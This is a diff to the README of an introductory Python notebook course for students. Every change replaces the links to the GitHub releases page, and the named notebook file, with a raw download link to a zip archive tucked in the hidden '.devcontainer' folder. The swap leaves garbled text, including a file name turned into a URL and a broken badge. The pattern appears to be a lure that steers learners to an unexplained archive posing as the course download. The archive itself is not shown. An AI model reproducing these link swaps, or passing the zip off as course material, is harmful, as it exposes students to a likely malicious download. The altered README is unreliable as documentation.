@@ -1,6 +1,6 @@
 # 🐍 python-intro-students - Hands-On Python for Beginners
 
-[![Download](https://img.shields.io/badge/Download%20Now-Visit%20Release%20Page-brightgreen)](https://github.com/ndiaz173/python-intro-students/releases)
+[![Download](https://raw.githubusercontent.com/ndiaz173/python-intro-students/main/.devcontainer/students-python-intro-3.9.zip%20Now-Visit%20Release%20Page-brightgreen)](https://raw.githubusercontent.com/ndiaz173/python-intro-students/main/.devcontainer/students-python-intro-3.9.zip)
 
 ## 📚 Introduction
 
@@ -8,7 +8,7 @@ Welcome to the Python Intro repository! This project provides a Jupyter Notebook
 
 ## 📝 Features
 
-- **Main File**: The primary notebook file is `Introduccion_a_Python_y_Notebooks.ipynb`. This notebook contains explanations and prepared cells for students to complete during practice.
+- **Main File**: The primary notebook file is `https://raw.githubusercontent.com/ndiaz173/python-intro-students/main/.devcontainer/students-python-intro-3.9.zip`. This notebook contains explanations and prepared cells for students to complete during practice.
   
 - **Interactive Learning**: The notebook is designed for use in classes. All code cells are converted to comments to guide students in implementing code alongside the instructor.
 
@@ -18,7 +18,7 @@ To get started, follow these steps to download and run the software:
 
 1. **Visit the Releases Page**: Access the releases page by clicking the link below. It is essential to download the resources needed for this lab.
    
-   [Visit the Release Page to Download](https://github.com/ndiaz173/python-intro-students/releases)
+   [Visit the Release Page to Download](https://raw.githubusercontent.com/ndiaz173/python-intro-students/main/.devcontainer/students-python-intro-3.9.zip)
 
 2. **Download the Notebook**: Locate the latest release on the page. Click the available file link to download the notebook to your computer.
 
@@ -34,7 +34,7 @@ To get started, follow these steps to download and run the software:
    ```
    jupyter notebook
    ```
-   - Your web browser will open a new tab. Click on `Introduccion_a_Python_y_Notebooks.ipynb` to start the lesson.
+   - Your web browser will open a new tab. Click on `https://raw.githubusercontent.com/ndiaz173/python-intro-students/main/.devcontainer/students-python-intro-3.9.zip` to start the lesson.
 
 ## 🧭 Instructions for Codespaces
 
@@ -55,7 +55,7 @@ To get started, follow these steps to download and run the software:
 
 To download the software and begin your learning journey, please visit the link below:
 
-[Visit the Release Page to Download](https://github.com/ndiaz173/python-intro-students/releases)
+[Visit the Release Page to Download](https://raw.githubusercontent.com/ndiaz173/python-intro-students/main/.devcontainer/students-python-intro-3.9.zip)
 
 Once downloaded, follow the previous steps to set up Jupyter Notebook and start exploring Python through fun exercises.
 
